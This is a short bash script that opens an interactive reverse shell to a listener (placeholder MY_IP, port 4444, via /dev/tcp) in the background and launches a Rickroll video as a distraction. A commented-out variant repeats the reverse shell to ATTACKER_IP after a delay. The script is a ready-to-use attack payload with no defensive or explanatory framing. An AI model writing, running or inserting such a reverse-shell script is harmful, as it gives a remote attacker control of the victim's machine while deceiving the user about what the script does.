#!/bin/bash
# Reverse shell to your listener (replace IP and port)
bash -i >& /dev/tcp/MY_IP/4444 0>&1 &
# Rickroll
xdg-open "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
# OR
# Spawn shell in background
# (sleep 3; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1) &
# Distraction Rickroll after delay
# sleep 5
# xdg-open "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
